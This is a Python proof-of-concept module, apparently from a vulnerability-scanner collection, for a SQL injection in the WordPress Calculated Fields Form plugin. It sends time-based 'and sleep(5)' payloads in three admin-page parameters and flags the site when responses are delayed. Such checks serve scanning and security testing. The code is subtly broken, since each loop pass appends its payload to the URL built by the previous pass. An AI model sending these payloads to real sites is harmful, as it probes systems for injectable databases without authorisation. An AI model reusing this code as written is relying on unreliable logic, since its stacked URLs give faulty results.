# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request, urllib.error, urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'WordPress_0012'  # 平台漏洞编号，留空
    name = 'WordPress Calculated Fields SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-02'  # 漏洞公布时间
    desc = '''
        There are sql injection vulnerabilities in Calculated Fields Form Plugin
        which could allow the attacker to execute sql queries into database.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36230/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Calculated Fields 1.0.10'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c295ccdc-7d8a-40f2-82e1-4c35b3b35aff'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = self.target
            payloads = {'/wp-admin/options-general.php?page=cp_calculated_fields_form&u=2 and sleep(5)&name=InsertText',
                        '/wp-admin/options-general.php?page=cp_calculated_fields_form&c=21 and sleep(5)',
                        '/wp-admin/options-general.php?page=cp_calculated_fields_form&d=3 and sleep(5)'
                        }
            for payload in payloads:
                verify_url += payload
                start_time = time.time()
                req = requests.get(verify_url)

                if time.time() - start_time > 5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
